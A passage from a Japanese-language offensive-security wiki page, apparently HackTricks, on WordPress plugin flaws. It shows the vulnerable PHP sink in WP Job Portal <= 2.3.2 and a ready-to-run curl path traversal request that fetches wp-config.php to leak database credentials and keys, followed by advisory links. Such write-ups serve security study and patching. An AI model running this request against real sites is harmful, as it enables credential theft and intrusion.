レスポンスは注入されたクエリの結果を公開するか、データベースを変更し、SQLi を立証します。


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

別のタスクである **downloadcustomfile** は、path traversal を介して訪問者にディスク上の**任意のファイル**をダウンロードさせることを許していました。脆弱なシンクは `modules/customfield/model.php::downloadCustomUploadedFile()` にあります:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` は攻撃者により制御され、**サニタイズされずに**連結されます。  再度、唯一の防御は履歴書ページから取得できる **CSRF nonce** です。

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
サーバーは `wp-config.php` の内容を返し、DB credentials と auth keys を leaking します。

## 参考資料

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
